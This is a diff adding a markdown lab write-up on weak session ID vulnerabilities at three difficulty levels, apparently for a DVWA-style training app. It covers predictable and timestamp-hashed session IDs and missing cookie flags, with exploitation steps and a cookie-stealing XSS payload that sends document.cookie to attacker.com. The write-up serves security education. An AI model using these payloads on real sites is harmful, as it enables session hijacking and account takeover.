@@ -1,0 +1,186 @@
+# Weak Session IDs
+
+**Security Levels:** Low | Medium | High
+
+---
+
+## LOW Level
+
+### Why it is Vulnerable
+
+* Session ID is predictable
+* Uses incremental numeric values
+* No randomness or entropy
+* Session not regenerated after login
+* Easily guessable session tokens
+
+---
+
+### Vulnerable Behavior
+
+```http
+Set-Cookie: PHPSESSID=1
+Set-Cookie: PHPSESSID=2
+Set-Cookie: PHPSESSID=3
+```
+
+---
+
+### Payloads (PoC)
+
+#### Session Fixation / Prediction
+
+```
+PHPSESSID=10
+PHPSESSID=11
+PHPSESSID=12
+```
+
+---
+
+### Exploitation Steps
+
+* Observe session ID pattern
+* Predict next valid session ID
+* Manually set cookie
+* Access victim session
+
+---
+
+### Result
+
+* Session hijacking successful
+* Victim account accessed
+
+---
+
+### Impact
+
+* Account takeover
+* Unauthorized access
+
+---
+
+### Severity: **High**
+
+---
+
+## MEDIUM Level
+
+### Why it is Vulnerable
+
+* Session ID generated using weak hash
+* Predictable timestamp-based value
+* No regeneration on privilege change
+* Limited entropy
+
+---
+
+### Code Behavior
+
+```php
+$_SESSION['id'] = md5(time());
+```
+
+---
+
+### Payloads (PoC)
+
+#### Hash Prediction
+
+```
+md5(time())
+md5(time()-1)
+md5(time()+1)
+```
+
+---
+
+### Exploitation Steps
+
+* Capture own session ID
+* Calculate nearby timestamps
+* Generate possible session IDs
+* Replay valid session
+
+---
+
+### Result
+
+* Session IDs guessed successfully
+* Authentication bypassed
+
+---
+
+### Impact
+
+* Session hijacking
+* Privilege escalation
+
+---
+
+### Severity: **Medium**
+
+---
+
+## HIGH Level
+
+### Why it is Vulnerable
+
+* Strong random session ID used
+* Session regenerated on login
+* Secure flags partially missing
+* No SameSite cookie attribute
+
+---
+
+### Vulnerable Configuration
+
+```http
+Set-Cookie: PHPSESSID=ad91f8c3e7a9b2d1f4e6; HttpOnly
+```
+
+---
+
+### Attack Concept
+
+> Exploit **session exposure via XSS or network sniffing** due to missing flags.
+
+---
+
+### Payloads (PoC)
+
+#### Session Theft via XSS
+
+```javascript
+document.location='http://attacker.com/?c='+document.cookie;
+```
+
+---
+
+### Result
+
+* Session ID stolen
+* Account hijacked
+
+---
+
+### Impact
+
+* Full account compromise
+* Weak cookie protection
+
+---
+
+### Severity: **High**
+
+---
+
+## Overall Impact Summary
+
+* Weak session IDs allow hijacking
+* Predictability breaks authentication
+* Missing cookie flags increase risk
+* Chaining with XSS worsens impact
+
+---
